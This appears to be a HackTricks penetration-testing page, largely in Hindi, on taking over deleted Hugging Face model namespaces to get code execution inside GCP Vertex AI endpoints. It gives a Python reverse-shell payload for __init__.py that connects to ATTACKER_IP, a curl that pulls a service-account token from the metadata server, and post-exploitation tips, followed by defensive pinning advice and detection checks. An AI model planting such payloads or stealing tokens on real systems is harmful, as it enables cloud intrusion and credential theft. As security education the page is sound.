# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## परिदृश्य

- Vertex AI Model Garden कई Hugging Face (HF) मॉडल्स की सीधे तैनाती की अनुमति देता है।
- HF model identifiers हैं Author/ModelName. यदि HF पर कोई author/org हटाया जाता है, तो वही author नाम किसी भी व्यक्ति द्वारा फिर से रजिस्टर किया जा सकता है। हमलावर तब उसी ModelName के साथ legacy path पर एक repo बना सकते हैं।
- नाम के आधार पर (बिना pinning/integrity) fetch करने वाले Pipelines, SDKs, या cloud catalogs attacker-controlled repo को pull कर लेंगे। जब मॉडल तैनात होता है, तो उस repo का loader code Vertex AI endpoint container के अंदर execute कर सकता है, जिससे endpoint की permissions के साथ RCE मिल सकती है।

HF पर दो सामान्य takeover केस:
- Ownership deletion: पुराना path 404 देता रहता है जब तक कोई author को फिर से रजिस्टर करके वही ModelName प्रकाशित न कर दे।
- Ownership transfer: HF पुराने Author/ModelName से नए author के पास 307 redirect जारी करता है। यदि पुराना author बाद में हटाया जाता है और एक attacker द्वारा फिर से रजिस्टर किया जाता है, तो redirect chain टूट जाती है और attacker का repo legacy path पर serve करता है।

## Reusable Namespaces (HF) की पहचान

- Old author deleted: author का पृष्ठ 404 लौटाता है; model path takeover तक 404 दे सकता है।
- Transferred models: जब पुराना author मौजूद होता है तो पुराना model path नए owner के लिए 307 जारी करता है। अगर पुराना author बाद में हटाया जाता है और फिर से रजिस्टर किया जाता है, तो legacy path attacker के repo को resolve करेगा।

curl के साथ त्वरित जाँच:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Vertex AI के खिलाफ End-to-end Attack Flow

1) Model Garden द्वारा deployable के रूप में सूचीबद्ध उन reusable model namespaces की खोज करें:
- Vertex AI Model Garden में ऐसे HF models खोजें जो अभी भी “verified deployable” के रूप में दिखते हैं।
- HF पर जांचें कि original Author हटाया गया है या मॉडल transfer हुआ और पुराने Author को बाद में हटाया गया था।

2) HF पर deleted Author को फिर से re-register करें और वही ModelName पुन: बनाएं।

3) एक malicious repo publish करें। ऐसा कोड शामिल करें जो model load पर execute हो। आम उदाहरण जो HF model load के दौरान आमतौर पर execute होते हैं:
- repo के __init__.py में side effects
- config/auto_map द्वारा refer किए गए custom modeling_*.py या processing code
- ऐसे code paths जो Transformers pipelines में trust_remote_code=True की आवश्यकता रखते हैं

4) legacy Author/ModelName का Vertex AI deployment अब attacker repo को pull करता है। loader Vertex AI endpoint container के अंदर execute होता है।

5) Payload endpoint environment (RCE) से endpoint की permissions के साथ access स्थापित कर देता है।

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
नोट्स
- वास्तविक दुनिया के loaders भिन्न होते हैं। कई Vertex AI HF integrations model के config में संदर्भित repo मॉड्यूल्स को clone और import करते हैं (उदा., auto_map), जो code execution को ट्रिगर कर सकते हैं। कुछ उपयोगों के लिए trust_remote_code=True आवश्यक होता है।
- The endpoint सामान्यतः एक समर्पित container में सीमित scope के साथ चलता है, लेकिन यह GCP में data access और lateral movement के लिए एक वैध प्रारम्भिक foothold हो सकता है।

## Post-Exploitation Tips (Vertex AI Endpoint)

Once code is running inside the endpoint container, consider:
- credentials/tokens के लिए environment variables और metadata को enumerate करना
- संलग्न storage या mounted model artifacts तक पहुँच बनाना
- service account identity के माध्यम से Google APIs के साथ interaction (Document AI, Storage, Pub/Sub, आदि)
- यदि प्लेटफ़ॉर्म repo को फिर से pull करता है तो model artifact में persistence

यदि उपलब्ध हो तो instance metadata को enumerate करें (container पर निर्भर):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Vertex AI उपयोगकर्ताओं के लिए रक्षात्मक मार्गदर्शन

- HF loaders में मॉडल्स को commit द्वारा पिन करें ताकि silent replacement रोका जा सके:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- सत्यापित HF मॉडलों को एक भरोसेमंद आंतरिक artifact store/registry में mirror करें और वहीं से deploy करें।
- कोडबेस और configs को लगातार स्कैन करें ताकि hard-coded Author/ModelName जो हटाए गए/हस्तांतरित हुए हैं, मिल सकें; इन्हें नए namespaces में अपडेट करें या commit द्वारा pin करें।
- Model Garden में deployment से पहले मॉडल provenance और लेखक के अस्तित्व को verify करें।

## पहचान ह्यूरिस्टिक्स (HTTP)

- हटाया गया लेखक: लेखक पेज 404; legacy model path 404 रहता है जब तक takeover नहीं होता।
- हस्तांतरित मॉडल: legacy path 307 नए लेखक की ओर जाता है जबकि पुराना लेखक मौजूद रहता है; यदि बाद में पुराना लेखक हटाया गया और पुनः-पंजीकृत कर दिया गया, तो legacy path हमलावर की सामग्री परोसता है।
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## क्रॉस-संदर्भ

- विस्तृत कार्यप्रणाली और सप्लाई-चेन नोट्स देखें:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## संदर्भ

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
